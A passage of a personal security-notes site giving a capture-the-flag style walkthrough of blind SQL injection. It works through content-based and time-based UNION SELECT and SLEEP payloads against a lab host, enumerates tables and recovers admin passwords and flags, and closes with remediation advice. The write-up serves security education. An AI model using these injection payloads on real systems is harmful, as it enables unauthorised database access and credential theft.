+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>http://example.com/items.php?id=1 and 1=2
+</code></pre></div>
+As a result, the SQL query changes to:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">items</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>
+</code></pre></div>
+The above SQL query will return a FALSE. If the web application is susceptible to SQLi, then it most likely will not return anything. To verify vulnerability, the attacker should inject a query that will return a TRUE.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>http://example.com/items.php?id=1 and 1=1
+</code></pre></div>
+If the contents of the web application injected with a query that returns TRUE are different than those of a query that returns FALSE, it is susceptible to content-based SQLi. Using this knowledge, it is possible to enumerate a whole database structure and its content.</p>
+<p>Let's look at a more practical example of how an attacker can leverage content-based blind SQLi to retrieve database structure and eventually a password for a specific user. As we will see with the following example, this method of SQL injection can be extremely time consuming based on the complexity of the database.</p>
+<p>The following example web application presents a mock browser with the following URL:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>https://website.thm/checkuser?username=admin
+</code></pre></div>
+The underlying SQL query is as follows:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;%username%&#39;</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</code></pre></div>
+<br></p>
+<p><img alt="Content-based SQLi" src="../../../assets/images/thm/sqli/10-contentbasedsqli.png" /></p>
+<p>The browser body shows the contents of <code>{"taken":true}</code> which replicates a common feature found in many sign-up forms that check whether a username already exists during registration and prompt the user to choose a different username.</p>
+<p>As we can see in the image above, the value for <code>taken</code> is set to <code>true</code> which implies that the username <code>admin</code> is already registered. Let's select a username that does not exist in the database (<code>test</code>) which give us a <code>taken</code> value of <code>false</code> and manipulate the the query such that it changes the value of <code>taken</code> to <code>true</code> in order to verify content-based SQLi vulnerability.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>https://website.thm/checkuser?username=test&#39; OR 1=1;--
+</code></pre></div>
+<br></p>
+<p><img alt="Content-based SQLi Vuln" src="../../../assets/images/thm/sqli/11-contentbasedsqliverify.png" /></p>
+<p>Notice that the even though <code>test</code> does not exist as a user and as such should give us a <code>taken</code> value of <code>false</code>, the addition of <code>OR 1=1;--</code> results in the query being always true.</p>
+<p>We can now begin enumerating the database structure using the UNION attack technique. Let's start by enumerating the number of columns in the table.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>https://website.thm/checkuser?username=test&#39; UNION SELECT null;--
+</code></pre></div>
+<br></p>
+<p><img alt="Content-based SQLi Column Enum Fail" src="../../../assets/images/thm/sqli/12-contentbasedcolumnenumfail.png" /></p>
+<p>Let's keep adding <code>null</code> to the statement until the number of columns match.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>https://website.thm/checkuser?username=test&#39; UNION SELECT null,null,null;--
+</code></pre></div>
+<br></p>
+<p><img alt="Content-based SQLi Column Enum Pass" src="../../../assets/images/thm/sqli/13-contentbasedcolumnenumpass.png" /></p>
+<p>With the number of columns known, we can begin enumerating the name of the database. This can be accomplished by using the built-in <code>database()</code> method in MySQL and then using the LIKE operator to try and find results that will return a <code>true</code> value for <code>taken</code>.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>https://website.thm/checkuser?username=test&#39; UNION SELECT null,null,null WHERE database() LIKE &#39;a%&#39;;--
+</code></pre></div>
+<br></p>
+<p><img alt="Content-based SQLi Database Enum Fail" src="../../../assets/images/thm/sqli/14-contentbasedsqlidatabaseenumfail.png" /></p>
+<p>Based on the statement above, we can be confident that the name of the database does not start with the letter 'a'. Continue cycle through all the letters, numbers and characters until the value of <code>taken</code> returns a <code>true</code>.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>https://website.thm/checkuser?username=test&#39; UNION SELECT null,null,null WHERE database() LIKE &#39;s%&#39;;--
+</code></pre></div>
+<br></p>
+<p><img alt="Content-based SQLi Database Enum Pass" src="../../../assets/images/thm/sqli/15-contentbasedsqlidatabaseenumpass.png" /></p>
+<p>Based on the result above, we can be confident that the first letter of the database's name is the letter 's'. We can now move onto the next character in the database name (ie. 'sa%', 'sb%, 'sc%', etc.) and continue the iteration process until all the characters of the database name have been discovered (<code>sqli_three</code>).</p>
+<p>Once we have established the database name, we can begin enumerating the table names using a similar method utilizing the <code>information_schema</code> database.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>https://website.thm/checkuser?username=test&#39; UNION SELECT null,null,null FROM information_schema.tables WHERE table_schema = &#39;sqli_three&#39; AND table_name LIKE &#39;a%&#39;;--
+</code></pre></div>
+Cycle through all the letters, numbers and characters until the value of <code>taken</code> returns a <code>true</code>. Going through the iterative process, we will discover a table in the <code>sqli_three</code> database named <code>users</code>.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>https://website.thm/checkuser?username=test&#39; UNION SELECT null,null,null FROM information_schema.tables WHERE table_schema = &#39;sqli_three&#39; AND table_name LIKE &#39;users&#39;;--
+</code></pre></div>
+<br></p>
+<p><img alt="Content-based SQLi Table Name Enum" src="../../../assets/images/thm/sqli/16-contentbasedsqlitablename.png" /></p>
+<p>With the table name now known, we can begin enumerating the columns in the <code>users</code> table. Here we will leverage the <code>information_schema.columns</code> method, database name and table name for enumeration.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>https://website.thm/checkuser?username=test&#39; UNION SELECT null,null,null FROM information_schema.columns WHERE table_schema = &#39;sqli_three&#39; AND table_name = &#39;users&#39; AND column_name like &#39;a%&#39;;--
+</code></pre></div>
+Cycle through all the letters, numbers and characters until the value of <code>taken</code> returns a <code>true</code>. As tables have multiple columns, we need to ensure that we add any found column names to our query to avoid re-discovering the same one again. As we iterate through, we will discover one of the column names <code>id</code> which we will need to add to our query.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>https://website.thm/checkuser?username=test&#39; UNION SELECT null,null,null FROM information_schema.columns WHERE table_schema = &#39;sqli_three&#39; AND table_name = &#39;users&#39; AND column_name like &#39;a%&#39; AND column_name != &#39;id&#39;;--
+</code></pre></div>
+Repeating the iteration process, we will discover three columns in the <code>users</code> table: <code>id</code>, <code>username</code> and <code>password</code>. With this knowledge we can start enumerating the password for a known user. Since we know that <code>admin</code> is a valid user, we can modify our query to begin the password discover.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>https://website.thm/checkuser?username=test&#39; UNION SELECT null,null,null FROM users WHERE username = &#39;admin&#39; and password LIKE &#39;a%&#39;;--
+</code></pre></div>
+Cycle through all the letters, numbers and characters until the value of <code>taken</code> returns a <code>true</code>. Repeating the iteration process we will discover the password <code>3845</code> for the <code>admin</code> user.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>https://website.thm/checkuser?username=test&#39; UNION SELECT null,null,null FROM users WHERE username = &#39;admin&#39; and password LIKE &#39;3845&#39;;--
+</code></pre></div>
+<br></p>
+<p><img alt="Content-based SQLi Admin Password Discovery" src="../../../assets/images/thm/sqli/17-contentbasedsqliadminpass.png" /></p>
+<p>Using the credentials <code>admin:3845</code> we can retrieve the flag: <code>THM{SQL_INJECTION_1093}</code></p>
+<p>As obvious for this example, content-based blind SQLi can be a time consuming endeavour but none-the-less allow an attacker to retrieve unauthorized data.</p>
+<h2 id="time-based-blind-sqli-injection">Time-based Blind SQLi Injection<a class="headerlink" href="#time-based-blind-sqli-injection" title="Permanent link">&para;</a></h2>
+<p>Time-based blind SQLi injections requires an attacker to observe the behaviour of a web application and its underlying database server after forcing the database to perform a time-intensive operation. If the web application does not return a response immediately, blind SQLi vulnerability is likely. This is useful for scenarios where no visual indicator of queries being TRUE or FALSE are presented.</p>
+<p>In MySQL, the built-in method SLEEP(x) alongside with UNION SELECT are typically leveraged.</p>
+<p>Let's look at a practical example of time-based blind SQLi.</p>
+<p>Begin by enumerating the number of columns in the table. We can do this by combining UNION SELECT with SLEEP(5). If the number of columns guessed is correct, we should observe a 5 second delay in the response time. If there was no pause in the response time then it is likely that the query was unsuccessful. Like in the previous example, we select a username (referrer) which does not exist in the database.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>https://website.thm/analytics?referrer=test&#39; UNION SELECT SLEEP(5);--
+</code></pre></div>
+<br></p>
+<p><img alt="Time-based Blind SQLi Column Enum Fail" src="../../../assets/images/thm/sqli/18-timebasedsqlicolumnfail.png" /></p>
+<p>Notice that the above query does not cause any time delay in the response time which indicates that our UNION SELECT statement did not execute due to an error (in this case a mismatch of columns between the SELECT statements). Let's continue enumerating the number of columns by incrementing the number of columns.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>https://website.thm/analytics?referrer=test&#39; UNION SELECT SLEEP(5),null;--
+</code></pre></div>
+<br></p>
+<p><img alt="Time-based Blind SQLi Column Enum Pass" src="../../../assets/images/thm/sqli/19-timebasedsqlicolumnpass.png" /></p>
+<p>Notice the delay of 5 seconds in the response time. This means that our UNION SELECT query executed successfully and that there are 2 columns.</p>
+<p>Based on this behaviour, we can follow the iterative process we used in the content-based blind SQLi attack to determine the database name, table name, column names and the credentials.</p>
+<p>Enumerate the database name <code>sqli_four</code> by:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>https://website.thm/analytics?referrer=test&#39; UNION SELECT SLEEP(5),null WHERE database() LIKE &#39;sqli_four&#39;;--
+</code></pre></div>
+<p>Enumerate the table name <code>users</code> by:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>https://website.thm/analytics?referrer=test&#39; UNION SELECT SLEEP(5),null FROM information_schema.tables WHERE table_schema = &#39;sqli_four&#39; AND table_name LIKE &#39;users&#39;;--
+</code></pre></div>
+<p>Enumerate column names <code>username</code> and <code>password</code> by:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>https://website.thm/analytics?referrer=test&#39; UNION SELECT SLEEP(5),null FROM information_schema.columns WHERE table_schema = &#39;sqli_four&#39; AND table_name = &#39;users&#39; AND column_name LIKE &#39;username&#39;;--
+</code></pre></div>
+<br></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>https://website.thm/analytics?referrer=test&#39; UNION SELECT SLEEP(5),null FROM information_schema.columns WHERE table_schema = &#39;sqli_four&#39; AND table_name = &#39;users&#39; AND column_name LIKE &#39;password&#39; AND column_name != &#39;username&#39;;--
+</code></pre></div>
+<p>Enumerate username <code>admin</code> by:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>https://website.thm/analytics?referrer=test&#39; UNION SELECT SLEEP(5),null FROM users WHERE username LIKE &#39;admin&#39;;--
+</code></pre></div>
+<p>Enumerate password <code>4961</code> by:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>https://website.thm/analytics?referrer=test&#39; UNION SELECT SLEEP(5),null FROM users WHERE username = &#39;admin&#39; AND password LIKE &#39;4961%&#39;;--
+</code></pre></div>
+Logging in with the credentials <code>admin:4961</code> we acquire the flag: <code>THM{SQL_INJECTION_MASTER}</code></p>
+<h2 id="out-of-band-sqli">Out-of-Band SQLi<a class="headerlink" href="#out-of-band-sqli" title="Permanent link">&para;</a></h2>
+<p>Out-of-band SQLi is a type of SQL injection where the attacker does not receive a response from the attacked web application on the same communication channel but instead is able to cause the application to send data to a remote endpoint. An out-of-band attack is classified by having two communication channels: one to launch the attack and one to gather the results.</p>
+<p>The general process of out-of-band SQLi follows these steps:
+1. An attacker makes a request to a web application vulnerable to SQL injection with an injection payload.
+2. The web application makes an SQL query to the database which also passes along the attacker's payload to the SQL server.
+3. The payload contains a request which forces an HTTP (or DNS) request back to the attackers machine containing data from the database.</p>
+<p>Out-of-band SQLi are not considered to be common in practice.</p>
+<h2 id="sqli-remediation">SQLi Remediation<a class="headerlink" href="#sqli-remediation" title="Permanent link">&para;</a></h2>
+<p>The following are some common remediation actions which can be put in place as remediation measures against SQLi:</p>
+<ol>
+<li>
+<p><strong>Prepared Statements (with Parameterized Queries)</strong> - In a prepared statement, the developer writes an SQL query first and then adds any user inputs as a parameter afterwards. Writing prepared statements ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data.</p>
+</li>
+<li>
+<p><strong>Input Validation</strong> - Syntactic validation of user input can significantly help in mitigating SQLi. Employing an allow (white) list can restrict input to only certain characters or strings. String replacement method in the various programming languages can filter the characters a developer wishes to allow or disallow.</p>
+</li>
+<li>
+<p><strong>Escaping User Input</strong> - Allowing user inputs to contain characters such as <code>' " $ \</code> can cause SQL queries to break and even lead to injection attacks. Escaping user input is a method of prepending a backslash (<code>\</code>) to these characters which causes them to be parsed just as a regular string and not as a special character in an SQL query.</p>
+</li>
+</ol>
+<p>Additional information on SQL injection prevention can be found at <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">SQL Injection Prevention Cheat Sheet</a>.</p>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">November 27, 2024</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../picklerick/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Pickle Rick">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Pickle Rick
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../sqlinjectionlab/" class="md-footer__link md-footer__link--next" aria-label="Next: SQL Injection Lab">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                SQL Injection Lab
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      &copy; 2024 Nouman Noor
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/nanoor" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://ca.linkedin.com/in/nouman-noor-60193727" target="_blank" rel="noopener" title="ca.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.annotate", "content.code.copy", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "toc.follow"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+    
+  </body>
+</html>
